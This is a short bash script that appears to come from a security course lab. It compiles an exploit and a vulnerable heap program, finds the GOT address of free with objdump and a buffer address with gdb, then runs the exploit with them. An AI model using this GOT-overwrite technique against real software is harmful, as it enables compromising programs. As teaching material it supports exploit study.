#!/bin/bash

# compile exploit.c and getscore_heap.c if they aren't already
gcc -g exploit.c -o exploit
gcc -g getscore_heap.c -o getscore_heap

# get parameters for exploit programmatically
BUF_LEN=128
GOT_FREE=0x`objdump -R getscore_heap | grep free | awk '{print $1}'`
BUF_ADDR=`gdb -batch -x gdbcommands.txt 2>/dev/null | grep '$1' | awk '{print $3}'`

# run the exploit with the parameters instantiated
./exploit $BUF_LEN $GOT_FREE $BUF_ADDR
